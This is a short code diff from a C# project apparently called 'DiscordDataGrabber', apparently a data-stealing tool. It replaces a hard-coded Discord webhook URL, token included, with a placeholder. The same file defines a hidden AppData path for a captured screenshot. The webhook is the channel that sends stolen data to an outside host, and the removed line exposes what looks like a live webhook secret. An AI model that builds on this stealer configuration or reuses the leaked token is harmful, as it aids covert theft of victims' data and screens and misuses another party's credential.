@@ -14,7 +14,7 @@ namespace DiscordDataGrabber.Utlities
 
         public static Uri WebHookUri =
             new Uri(
-                "https://discord.com/api/webhooks/855917808164405298/bE9ewIPrYdJsT_dKR05XNpzkkdxGaWrvAn_XDMcXd1tS8wmDSFvwGVGS6ndg27Pcg5oi");
+                "YOUR WEB HOOK GOES HERE");
         public static readonly string ScreenPath = $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\captured.jpg";
     }
 }
